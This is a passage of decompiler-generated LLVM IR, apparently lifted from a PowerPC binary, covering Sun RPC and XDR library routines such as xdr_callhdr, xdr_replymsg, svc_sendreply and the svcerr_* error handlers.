  %v0_10022f84 = load i32, i32* @r31, align 4
  %v1_10022f84 = add i32 %v0_10022f84, 12
  store i32 %v1_10022f84, i32* @r4, align 4
  %v3_10022f88 = icmp eq i32 %v0_10022f80, 0
  %v0_10022f8c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10022f8c, i32* @r3, align 4
  br i1 %v3_10022f88, label %dec_label_pc_10022fa8, label %dec_label_pc_10022f94

dec_label_pc_10022f94:                            ; preds = %dec_label_pc_10022f80
  store i32 %v0_10022f44, i32* @lr, align 4
  %v0_10022fa4 = call i32 @xdr_u_long()
  br label %dec_label_pc_10022fa8

dec_label_pc_10022fa8:                            ; preds = %dec_label_pc_10022f80, %dec_label_pc_10022f6c, %entry, %dec_label_pc_10022f94
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_10022fa8, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_10022fc0 = add i32 %arg1, 8
  %v2_10022fc0 = inttoptr i32 %v1_10022fc0 to i32*
  %v3_10022fc0 = load i32, i32* %v2_10022fc0, align 4
  store i32 %v3_10022fc0, i32* @r10, align 4
  %v3_10022fc4 = icmp eq i32 %v3_10022fc0, 0
  br i1 %v3_10022fc4, label %dec_label_pc_10022fd8, label %dec_label_pc_10022fcc

dec_label_pc_10022fcc:                            ; preds = %entry
  %v3_10022fcc = icmp eq i32 %v3_10022fc0, 1
  br i1 %v3_10022fcc, label %dec_label_pc_10023058, label %dec_label_pc_10023090

dec_label_pc_10022fd8:                            ; preds = %entry
  %v1_10022fd8 = add i32 %arg1, 24
  %v2_10022fd8 = inttoptr i32 %v1_10022fd8 to i32*
  %v3_10022fd8 = load i32, i32* %v2_10022fd8, align 4
  store i32 %v3_10022fd8, i32* %r11.global-to-local, align 4
  %v3_10022fdc = icmp eq i32 %v3_10022fd8, 0
  br i1 %v3_10022fdc, label %dec_label_pc_10022fe4, label %dec_label_pc_10022fec

dec_label_pc_10022fe4:                            ; preds = %dec_label_pc_10022fd8
  store i32 0, i32* %arg2, align 4
  ret i32 %arg1

dec_label_pc_10022fec:                            ; preds = %dec_label_pc_10022fd8
  %v2_10022fec = icmp ugt i32 %v3_10022fd8, 5
  br i1 %v2_10022fec, label %dec_label_pc_10023044, label %dec_label_pc_10022ff4

dec_label_pc_10022ff4:                            ; preds = %dec_label_pc_10022fec
  %v1_10022ff8 = mul i32 %v3_10022fd8, 4
  store i32 %v1_10022ff8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002fa44.1312 to i32), i32* %r9.global-to-local, align 4
  %v2_10023000 = add i32 %v1_10022ff8, ptrtoint (i32* @global_var_1002fa44.1312 to i32)
  %v3_10023000 = inttoptr i32 %v2_10023000 to i32*
  %v4_10023000 = load i32, i32* %v3_10023000, align 4
  %v2_10023004 = add i32 %v4_10023000, ptrtoint (i32* @global_var_1002fa44.1312 to i32)
  store i32 %v2_10023004, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10023004)
  br label %dec_label_pc_1002301c

dec_label_pc_1002301c:                            ; preds = %dec_label_pc_10023058, %dec_label_pc_10022ff4
  %storemerge1 = phi i32 [ 8, %dec_label_pc_10022ff4 ], [ 7, %dec_label_pc_10023058 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 %storemerge1, i32* %arg2, align 4
  br label %dec_label_pc_100230a0

dec_label_pc_10023044:                            ; preds = %dec_label_pc_10022fec
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10023048 = add i32 %tmp, 4
  %v3_10023048 = inttoptr i32 %v2_10023048 to i32*
  store i32 0, i32* %v3_10023048, align 4
  %v0_1002304c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1002304c, i32* %arg2, align 4
  %v0_10023050 = load i32, i32* %r11.global-to-local, align 4
  %v2_10023050 = add i32 %tmp, 8
  %v3_10023050 = inttoptr i32 %v2_10023050 to i32*
  store i32 %v0_10023050, i32* %v3_10023050, align 4
  br label %dec_label_pc_100230a0thread-pre-split

dec_label_pc_10023058:                            ; preds = %dec_label_pc_10022fcc
  %v1_10023058 = add i32 %arg1, 12
  %v2_10023058 = inttoptr i32 %v1_10023058 to i32*
  %v3_10023058 = load i32, i32* %v2_10023058, align 4
  store i32 %v3_10023058, i32* %r9.global-to-local, align 4
  %v3_1002305c = icmp eq i32 %v3_10023058, 1
  br i1 %v3_1002305c, label %dec_label_pc_1002301c, label %dec_label_pc_10023064

dec_label_pc_10023064:                            ; preds = %dec_label_pc_10023058
  %v3_10023064 = icmp eq i32 %v3_10023058, 6
  br i1 %v3_10023064, label %dec_label_pc_1002306c, label %dec_label_pc_1002307c

dec_label_pc_1002306c:                            ; preds = %dec_label_pc_10023064
  store i32 6, i32* %arg2, align 4
  br label %dec_label_pc_100230a0

dec_label_pc_1002307c:                            ; preds = %dec_label_pc_10023064
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10023080 = add i32 %tmp, 4
  %v3_10023080 = inttoptr i32 %v2_10023080 to i32*
  store i32 1, i32* %v3_10023080, align 4
  %v0_10023084 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10023084, i32* %arg2, align 4
  %v0_10023088 = load i32, i32* %r9.global-to-local, align 4
  %v2_10023088 = add i32 %tmp, 8
  %v3_10023088 = inttoptr i32 %v2_10023088 to i32*
  store i32 %v0_10023088, i32* %v3_10023088, align 4
  br label %dec_label_pc_100230a0thread-pre-split

dec_label_pc_10023090:                            ; preds = %dec_label_pc_10022fcc
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 16, i32* %arg2, align 4
  %v3_10023098 = load i32, i32* %v2_10022fc0, align 4
  store i32 %v3_10023098, i32* %r0.global-to-local, align 4
  %v2_1002309c = add i32 %tmp, 4
  %v3_1002309c = inttoptr i32 %v2_1002309c to i32*
  store i32 %v3_10023098, i32* %v3_1002309c, align 4
  br label %dec_label_pc_100230a0thread-pre-split

dec_label_pc_100230a0thread-pre-split:            ; preds = %dec_label_pc_10023090, %dec_label_pc_10023044, %dec_label_pc_1002307c
  %v2_100230a0.pr = load i32, i32* %arg2, align 4
  br label %dec_label_pc_100230a0

dec_label_pc_100230a0:                            ; preds = %dec_label_pc_100230a0thread-pre-split, %dec_label_pc_1002301c, %dec_label_pc_1002306c
  %v0_100230b4 = phi i32 [ %v2_100230a0.pr, %dec_label_pc_100230a0thread-pre-split ], [ %storemerge1, %dec_label_pc_1002301c ], [ 6, %dec_label_pc_1002306c ]
  store i32 %v0_100230b4, i32* %r0.global-to-local, align 4
  %v3_100230a4 = icmp eq i32 %v0_100230b4, 7
  br i1 %v3_100230a4, label %dec_label_pc_100230cc, label %dec_label_pc_100230ac

dec_label_pc_100230ac:                            ; preds = %dec_label_pc_100230a0
  %v3_100230ac = icmp eq i32 %v0_100230b4, 9
  br i1 %v3_100230ac, label %dec_label_pc_100230d8, label %dec_label_pc_100230b4

dec_label_pc_100230b4:                            ; preds = %dec_label_pc_100230ac
  %v0_100230b8 = load i32, i32* @lr, align 4
  %v2_100230b8 = icmp ne i32 %v0_100230b4, 6
  call void @__pseudo_cond_branch(i1 %v2_100230b8, i32 %v0_100230b8)
  %v1_100230bc = add i32 %arg1, 16
  %v2_100230bc = inttoptr i32 %v1_100230bc to i32*
  %v3_100230bc = load i32, i32* %v2_100230bc, align 4
  store i32 %v3_100230bc, i32* %r0.global-to-local, align 4
  %v2_100230c0 = add i32 %tmp, 4
  %v3_100230c0 = inttoptr i32 %v2_100230c0 to i32*
  store i32 %v3_100230bc, i32* %v3_100230c0, align 4
  %v1_100230c4 = add i32 %arg1, 20
  br label %dec_label_pc_100230e4

dec_label_pc_100230cc:                            ; preds = %dec_label_pc_100230a0
  %v1_100230cc = add i32 %arg1, 16
  %v2_100230cc = inttoptr i32 %v1_100230cc to i32*
  %v3_100230cc = load i32, i32* %v2_100230cc, align 4
  store i32 %v3_100230cc, i32* %r0.global-to-local, align 4
  %v2_100230d0 = add i32 %tmp, 4
  %v3_100230d0 = inttoptr i32 %v2_100230d0 to i32*
  store i32 %v3_100230cc, i32* %v3_100230d0, align 4
  ret i32 %arg1

dec_label_pc_100230d8:                            ; preds = %dec_label_pc_100230ac
  %v1_100230d8 = add i32 %arg1, 28
  %v2_100230d8 = inttoptr i32 %v1_100230d8 to i32*
  %v3_100230d8 = load i32, i32* %v2_100230d8, align 4
  store i32 %v3_100230d8, i32* %r0.global-to-local, align 4
  %v2_100230dc = add i32 %tmp, 4
  %v3_100230dc = inttoptr i32 %v2_100230dc to i32*
  store i32 %v3_100230d8, i32* %v3_100230dc, align 4
  %v1_100230e0 = add i32 %arg1, 32
  br label %dec_label_pc_100230e4

dec_label_pc_100230e4:                            ; preds = %dec_label_pc_100230b4, %dec_label_pc_100230d8
  %storemerge.in.in = phi i32 [ %v1_100230c4, %dec_label_pc_100230b4 ], [ %v1_100230e0, %dec_label_pc_100230d8 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_100230e4 = add i32 %tmp, 8
  %v3_100230e4 = inttoptr i32 %v2_100230e4 to i32*
  store i32 %storemerge, i32* %v3_100230e4, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v0_100230b4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10022ff8, { 1, 0 }
  uselistorder i32 %tmp, { 5, 2, 3, 6, 8, 4, 7, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 9, 10 }
  uselistorder i32* %arg2, { 0, 6, 5, 4, 2, 3, 1, 7 }
  uselistorder i32 %arg1, { 2, 6, 4, 0, 5, 3, 9, 7, 8, 1, 10 }
  uselistorder label %dec_label_pc_100230e4, { 1, 0 }
  uselistorder label %dec_label_pc_100230a0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100230a0thread-pre-split, { 0, 2, 1 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_100230f0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10023104 = add i32 %arg2, 4
  %v3_10023104 = inttoptr i32 %v2_10023104 to i32*
  store i32 0, i32* %v3_10023104, align 4
  %v2_1002310c = add i32 %arg2, 8
  %v3_1002310c = inttoptr i32 %v2_1002310c to i32*
  store i32 2, i32* %v3_1002310c, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10023114 = load i32, i32* %arg1, align 4
  %v3_10023118 = icmp eq i32 %v2_10023114, 0
  br i1 %v3_10023118, label %dec_label_pc_10023120, label %dec_label_pc_10023184

dec_label_pc_10023120:                            ; preds = %entry
  store i32 268579108, i32* @lr, align 4
  %v0_10023120 = call i32 @xdr_u_long()
  %v3_10023128 = icmp eq i32 %v0_10023120, 0
  %v0_1002312c = load i32, i32* @r31, align 4
  store i32 %v0_1002312c, i32* @r3, align 4
  br i1 %v3_10023128, label %dec_label_pc_10023184, label %dec_label_pc_10023134

dec_label_pc_10023134:                            ; preds = %dec_label_pc_10023120
  store i32 268579128, i32* @lr, align 4
  %v0_10023134 = call i32 @xdr_enum()
  %v0_10023138 = load i32, i32* @r30, align 4
  %v1_10023138 = add i32 %v0_10023138, 8
  store i32 %v1_10023138, i32* @r4, align 4
  %v3_1002313c = icmp eq i32 %v0_10023134, 0
  %v0_10023140 = load i32, i32* @r31, align 4
  store i32 %v0_10023140, i32* @r3, align 4
  br i1 %v3_1002313c, label %dec_label_pc_10023184, label %dec_label_pc_10023148

dec_label_pc_10023148:                            ; preds = %dec_label_pc_10023134
  store i32 268579148, i32* @lr, align 4
  %v0_10023148 = call i32 @xdr_u_long()
  %v0_1002314c = load i32, i32* @r30, align 4
  %v1_1002314c = add i32 %v0_1002314c, 12
  store i32 %v1_1002314c, i32* @r4, align 4
  %v3_10023150 = icmp eq i32 %v0_10023148, 0
  %v0_10023154 = load i32, i32* @r31, align 4
  store i32 %v0_10023154, i32* @r3, align 4
  br i1 %v3_10023150, label %dec_label_pc_10023184, label %dec_label_pc_1002315c

dec_label_pc_1002315c:                            ; preds = %dec_label_pc_10023148
  store i32 268579168, i32* @lr, align 4
  %v0_1002315c = call i32 @xdr_u_long()
  %v0_10023160 = load i32, i32* @r30, align 4
  %v1_10023160 = add i32 %v0_10023160, 16
  store i32 %v1_10023160, i32* @r4, align 4
  %v3_10023164 = icmp eq i32 %v0_1002315c, 0
  %v0_10023168 = load i32, i32* @r31, align 4
  store i32 %v0_10023168, i32* @r3, align 4
  br i1 %v3_10023164, label %dec_label_pc_10023184, label %dec_label_pc_10023170

dec_label_pc_10023170:                            ; preds = %dec_label_pc_1002315c
  store i32 %v0_100230f0, i32* @lr, align 4
  %v0_10023180 = call i32 @xdr_u_long()
  br label %dec_label_pc_10023184

dec_label_pc_10023184:                            ; preds = %entry, %dec_label_pc_1002315c, %dec_label_pc_10023148, %dec_label_pc_10023134, %dec_label_pc_10023120, %dec_label_pc_10023170
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10023184, { 5, 1, 2, 3, 4, 0 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  %v0_100231a0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 268579256, i32* @lr, align 4
  %v0_100231b4 = call i32 @xdr_enum()
  %v3_100231b8 = icmp eq i32 %v0_100231b4, 0
  br i1 %v3_100231b8, label %dec_label_pc_10023224, label %dec_label_pc_100231c0

dec_label_pc_100231c0:                            ; preds = %entry
  %v0_100231c0 = load i32, i32* @r31, align 4
  %v1_100231c0 = inttoptr i32 %v0_100231c0 to i32*
  %v2_100231c0 = load i32, i32* %v1_100231c0, align 4
  %v1_100231c4 = add i32 %v0_100231c0, 4
  store i32 %v1_100231c4, i32* @r4, align 4
  %v0_100231c8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100231c8, i32* @r3, align 4
  %v3_100231cc = icmp eq i32 %v2_100231c0, 0
  br i1 %v3_100231cc, label %dec_label_pc_100231e0, label %dec_label_pc_100231d8

dec_label_pc_100231d8:                            ; preds = %dec_label_pc_100231c0
  %v3_100231d0 = icmp eq i32 %v2_100231c0, 1
  br i1 %v3_100231d0, label %dec_label_pc_10023208, label %dec_label_pc_10023224

dec_label_pc_100231e0:                            ; preds = %dec_label_pc_100231c0
  store i32 268579300, i32* @lr, align 4
  %v0_100231e0 = call i32 @xdr_u_long()
  %v0_100231e4 = load i32, i32* @r31, align 4
  %v1_100231e4 = add i32 %v0_100231e4, 8
  store i32 %v1_100231e4, i32* @r4, align 4
  %v3_100231e8 = icmp eq i32 %v0_100231e0, 0
  %v0_100231ec = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100231ec, i32* @r3, align 4
  br i1 %v3_100231e8, label %dec_label_pc_10023224, label %dec_label_pc_100231f4

dec_label_pc_100231f4:                            ; preds = %dec_label_pc_100231e0
  store i32 %v0_100231a0, i32* @lr, align 4
  %v0_10023204 = call i32 @xdr_u_long()
  %v0_1002320c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10023208

dec_label_pc_10023208:                            ; preds = %dec_label_pc_100231d8, %dec_label_pc_100231f4
  %v0_1002320c = phi i32 [ %v0_100231c8, %dec_label_pc_100231d8 ], [ %v0_1002320c.pre, %dec_label_pc_100231f4 ]
  store i32 %v0_1002320c, i32* @r3, align 4
  store i32 %v0_100231a0, i32* @lr, align 4
  %v0_10023220 = call i32 @xdr_enum()
  br label %dec_label_pc_10023224

dec_label_pc_10023224:                            ; preds = %dec_label_pc_100231d8, %dec_label_pc_100231e0, %entry, %dec_label_pc_10023208
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_10023224, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10023208, { 1, 0 }
}

define i32 @__GI_xdr_replymsg(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10023240 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268579416, i32* @lr, align 4
  %v0_10023254 = call i32 @xdr_u_long()
  %v3_1002325c = icmp eq i32 %v0_10023254, 0
  %v0_10023260 = load i32, i32* @r30, align 4
  store i32 %v0_10023260, i32* @r3, align 4
  br i1 %v3_1002325c, label %dec_label_pc_100232ac, label %dec_label_pc_10023268

dec_label_pc_10023268:                            ; preds = %entry
  store i32 268579436, i32* @lr, align 4
  %v0_10023268 = call i32 @xdr_enum()
  %v3_1002326c = icmp eq i32 %v0_10023268, 0
  br i1 %v3_1002326c, label %dec_label_pc_100232ac, label %dec_label_pc_10023274

dec_label_pc_10023274:                            ; preds = %dec_label_pc_10023268
  %v0_10023274 = load i32, i32* @r31, align 4
  %v1_10023274 = add i32 %v0_10023274, 4
  %v2_10023274 = inttoptr i32 %v1_10023274 to i32*
  %v3_10023274 = load i32, i32* %v2_10023274, align 4
  %v3_1002328c = icmp eq i32 %v3_10023274, 1
  br i1 %v3_1002328c, label %dec_label_pc_10023298, label %dec_label_pc_100232ac

dec_label_pc_10023298:                            ; preds = %dec_label_pc_10023274
  %v1_10023288 = add i32 %v0_10023274, 8
  %v1_10023280 = add i32 %v0_10023274, 12
  %v0_1002327c = load i32, i32* @r30, align 4
  store i32 %v0_10023240, i32* @lr, align 4
  %v5_100232a8 = inttoptr i32 %v1_10023288 to i32*
  %v6_100232a8 = call i32 @xdr_union(i32 %v0_1002327c, i32* %v5_100232a8, i32 %v1_10023280, i32 ptrtoint (i32* @global_var_1002fa5c.1313 to i32), i32 0)
  br label %dec_label_pc_100232ac

dec_label_pc_100232ac:                            ; preds = %dec_label_pc_10023274, %dec_label_pc_10023268, %entry, %dec_label_pc_10023298
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_100232ac, { 3, 0, 1, 2 }
}

define i32 @xdr_des_block() local_unnamed_addr {
entry:
  store i32 8, i32* @r5, align 4
  %v2_100232c8 = call i32 @xdr_opaque(i32* inttoptr (i32 8 to i32*))
  ret i32 %v2_100232c8
}

define i32 @xdr_opaque_auth() local_unnamed_addr {
entry:
  %v0_100232d0 = load i32, i32* @lr, align 4
  %v0_100232d8 = load i32, i32* @r4, align 4
  %v0_100232e0 = load i32, i32* @r3, align 4
  store i32 %v0_100232e0, i32* @r31, align 4
  store i32 268579560, i32* @lr, align 4
  %v0_100232e4 = call i32 @xdr_enum()
  %v3_100232ec = icmp eq i32 %v0_100232e4, 0
  br i1 %v3_100232ec, label %dec_label_pc_10023314, label %dec_label_pc_100232fc

dec_label_pc_100232fc:                            ; preds = %entry
  %v1_100232f0 = add i32 %v0_100232d8, 4
  %v1_100232e8 = add i32 %v0_100232d8, 8
  %v0_10023300 = load i32, i32* @r31, align 4
  store i32 %v0_100232d0, i32* @lr, align 4
  %v4_10023310 = inttoptr i32 %v0_10023300 to i32*
  %v5_10023310 = call i32 @xdr_bytes(i32* %v4_10023310, i32 %v1_100232f0, i32 %v1_100232e8, i32 400)
  br label %dec_label_pc_10023314

dec_label_pc_10023314:                            ; preds = %entry, %dec_label_pc_100232fc
  %v0_10023324 = phi i32 [ 0, %entry ], [ %v5_10023310, %dec_label_pc_100232fc ]
  ret i32 %v0_10023324

; uselistorder directives
  uselistorder label %dec_label_pc_10023314, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1002332c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268579652, i32* @lr, align 4
  %v0_10023340 = call i32 @xdr_opaque_auth()
  %v3_10023348 = icmp eq i32 %v0_10023340, 0
  %v0_1002334c = load i32, i32* @r30, align 4
  store i32 %v0_1002334c, i32* @r3, align 4
  br i1 %v3_10023348, label %dec_label_pc_100233cc, label %dec_label_pc_10023354

dec_label_pc_10023354:                            ; preds = %entry
  store i32 268579672, i32* @lr, align 4
  %v0_10023354 = call i32 @xdr_enum()
  store i32 %v0_10023354, i32* %r3.global-to-local, align 4
  %v3_10023358 = icmp eq i32 %v0_10023354, 0
  br i1 %v3_10023358, label %dec_label_pc_100233cc, label %dec_label_pc_10023360

dec_label_pc_10023360:                            ; preds = %dec_label_pc_10023354
  %v0_10023360 = load i32, i32* @r31, align 4
  %v1_10023360 = add i32 %v0_10023360, 12
  %v2_10023360 = inttoptr i32 %v1_10023360 to i32*
  %v3_10023360 = load i32, i32* %v2_10023360, align 4
  %v0_10023364 = load i32, i32* @r30, align 4
  store i32 %v0_10023364, i32* %r3.global-to-local, align 4
  %v3_1002336c = icmp eq i32 %v3_10023360, 0
  br i1 %v3_1002336c, label %dec_label_pc_10023380, label %dec_label_pc_10023378

dec_label_pc_10023378:                            ; preds = %dec_label_pc_10023360
  %v3_10023370 = icmp eq i32 %v3_10023360, 2
  br i1 %v3_10023370, label %dec_label_pc_1002339c, label %dec_label_pc_100233d0

dec_label_pc_10023380:                            ; preds = %dec_label_pc_10023360
  %v1_10023384 = add i32 %v0_10023360, 20
  %v2_10023384 = inttoptr i32 %v1_10023384 to i32*
  %v3_10023384 = load i32, i32* %v2_10023384, align 4
  call void @__pseudo_call(i32 %v3_10023384)
  %v0_10023394 = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100233d0

dec_label_pc_1002339c:                            ; preds = %dec_label_pc_10023378
  %v1_1002339c = add i32 %v0_10023360, 16
  store i32 %v1_1002339c, i32* @r4, align 4
  store i32 %v0_10023364, i32* @r3, align 4
  store i32 268579752, i32* @lr, align 4
  %v0_100233a4 = call i32 @xdr_u_long()
  %v0_100233a8 = load i32, i32* @r31, align 4
  %v1_100233a8 = add i32 %v0_100233a8, 20
  store i32 %v1_100233a8, i32* @r4, align 4
  %v3_100233ac = icmp eq i32 %v0_100233a4, 0
  %v0_100233b0 = load i32, i32* @r30, align 4
  store i32 %v0_100233b0, i32* @r3, align 4
  br i1 %v3_100233ac, label %dec_label_pc_100233cc, label %dec_label_pc_100233b8

dec_label_pc_100233b8:                            ; preds = %dec_label_pc_1002339c
  store i32 %v0_1002332c, i32* @lr, align 4
  %v0_100233c8 = call i32 @xdr_u_long()
  store i32 %v0_100233c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100233cc

dec_label_pc_100233cc:                            ; preds = %dec_label_pc_1002339c, %dec_label_pc_10023354, %entry, %dec_label_pc_100233b8
  br label %dec_label_pc_100233d0

dec_label_pc_100233d0:                            ; preds = %dec_label_pc_10023378, %dec_label_pc_10023380, %dec_label_pc_100233cc
  %v0_100233d4 = phi i32 [ 1, %dec_label_pc_10023378 ], [ %v0_10023394, %dec_label_pc_10023380 ], [ 0, %dec_label_pc_100233cc ]
  store i32 %v0_100233d4, i32* %r3.global-to-local, align 4
  ret i32 %v0_100233d4

; uselistorder directives
  uselistorder i32 %v0_100233d4, { 1, 0 }
  uselistorder i32 %v0_10023360, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100233d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100233cc, { 3, 0, 1, 2 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1002342c = add i32 %arg1, 8
  %v2_1002342c = inttoptr i32 %v1_1002342c to i32*
  %v3_1002342c = load i32, i32* %v2_1002342c, align 4
  %v1_10023430 = add i32 %v3_1002342c, 12
  %v2_10023430 = inttoptr i32 %v1_10023430 to i32*
  %v3_10023430 = load i32, i32* %v2_10023430, align 4
  call void @__pseudo_call(i32 %v3_10023430)
  ret i32 %arg1
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10023488 = add i32 %arg1, 8
  %v2_10023488 = inttoptr i32 %v1_10023488 to i32*
  %v3_10023488 = load i32, i32* %v2_10023488, align 4
  %v1_1002348c = add i32 %v3_10023488, 12
  %v2_1002348c = inttoptr i32 %v1_1002348c to i32*
  %v3_1002348c = load i32, i32* %v2_1002348c, align 4
  call void @__pseudo_call(i32 %v3_1002348c)
  ret i32 %arg1
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100234e0 = add i32 %arg1, 8
  %v2_100234e0 = inttoptr i32 %v1_100234e0 to i32*
  %v3_100234e0 = load i32, i32* %v2_100234e0, align 4
  %v1_100234e4 = add i32 %v3_100234e0, 12
  %v2_100234e4 = inttoptr i32 %v1_100234e4 to i32*
  %v3_100234e4 = load i32, i32* %v2_100234e4, align 4
  call void @__pseudo_call(i32 %v3_100234e4)
  ret i32 %arg1
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10023538 = add i32 %arg1, 8
  %v2_10023538 = inttoptr i32 %v1_10023538 to i32*
  %v3_10023538 = load i32, i32* %v2_10023538, align 4
  %v1_1002353c = add i32 %v3_10023538, 12
  %v2_1002353c = inttoptr i32 %v1_1002353c to i32*
  %v3_1002353c = load i32, i32* %v2_1002353c, align 4
  call void @__pseudo_call(i32 %v3_1002353c)
  ret i32 %arg1
}

define i32 @svcerr_auth(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1002357c = add i32 %arg1, 8
  %v2_1002357c = inttoptr i32 %v1_1002357c to i32*
  %v3_1002357c = load i32, i32* %v2_1002357c, align 4
  %v1_10023580 = add i32 %v3_1002357c, 12
  %v2_10023580 = inttoptr i32 %v1_10023580 to i32*
  %v3_10023580 = load i32, i32* %v2_10023580, align 4
  call void @__pseudo_call(i32 %v3_10023580)
  ret i32 %arg1
}

define i32 @svcerr_weakauth() local_unnamed_addr {
entry:
  %v1_100235a0 = call i32 @svcerr_auth(i32 5)
  ret i32 %v1_100235a0
}

define i32 @__GI_svcerr_noprog(i32 %arg1) local_unnamed_addr {
entry:
  store i32 1, i32* @r10, align 4
  %v1_100235d8 = add i32 %arg1, 8
  %v2_100235d8 = inttoptr i32 %v1_100235d8 to i32*
  %v3_100235d8 = load i32, i32* %v2_100235d8, align 4
  %v1_100235dc = add i32 %v3_100235d8, 12
  %v2_100235dc = inttoptr i32 %v1_100235dc to i32*
  %v3_100235dc = load i32, i32* %v2_100235dc, align 4
  call void @__pseudo_call(i32 %v3_100235dc)
  ret i32 %arg1
}

define i32 @svcerr_progvers(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10023614 = load i32, i32* @r5, align 4
  store i32 %v0_10023614, i32* @r29, align 4
  %v1_10023640 = add i32 %arg1, 8
  %v2_10023640 = inttoptr i32 %v1_10023640 to i32*
  %v3_10023640 = load i32, i32* %v2_10023640, align 4
  %v1_10023644 = add i32 %v3_10023640, 12
  %v2_10023644 = inttoptr i32 %v1_10023644 to i32*
  %v3_10023644 = load i32, i32* %v2_10023644, align 4
  call void @__pseudo_call(i32 %v3_10023644)
  ret i32 %arg1
}

define i32 @svc_find(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v0_10023678 = load i32, i32* @r4, align 4
  store i32 %v0_10023678, i32* @r31, align 4
  %v0_1002367c = load i32, i32* @r5, align 4
  store i32 %v0_1002367c, i32* @r30, align 4
  store i32 268580484, i32* @lr, align 4
  %v0_10023680 = call i32 @__rpc_thread_variables()
  store i32 %v0_10023680, i32* %r3.global-to-local, align 4
  %v1_10023684 = add i32 %v0_10023680, 184
  %v2_10023684 = inttoptr i32 %v1_10023684 to i32*
  %v3_10023684 = load i32, i32* %v2_10023684, align 4
  store i32 %v3_10023684, i32* %r3.global-to-local, align 4
  %v3_100236b03 = icmp eq i32 %v3_10023684, 0
  br i1 %v3_100236b03, label %dec_label_pc_100236b8, label %dec_label_pc_10023690.lr.ph

dec_label_pc_10023690.lr.ph:                      ; preds = %entry
  %v1_10023694.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10023690

dec_label_pc_10023690:                            ; preds = %dec_label_pc_10023690.lr.ph, %dec_label_pc_100236a8
  %v0_100236b86 = phi i32 [ 0, %dec_label_pc_10023690.lr.ph ], [ %v0_100236a8, %dec_label_pc_100236a8 ]
  %v0_100236a8 = phi i32 [ %v3_10023684, %dec_label_pc_10023690.lr.ph ], [ %v2_100236ac, %dec_label_pc_100236a8 ]
  %v1_10023690 = add i32 %v0_100236a8, 4
  %v2_10023690 = inttoptr i32 %v1_10023690 to i32*
  %v3_10023690 = load i32, i32* %v2_10023690, align 4
  %v4_10023694 = icmp eq i32 %v3_10023690, %v1_10023694.pre
  br i1 %v4_10023694, label %dec_label_pc_1002369c, label %dec_label_pc_100236a8

dec_label_pc_1002369c:                            ; preds = %dec_label_pc_10023690
  %v1_1002369c = add i32 %v0_100236a8, 8
  %v2_1002369c = inttoptr i32 %v1_1002369c to i32*
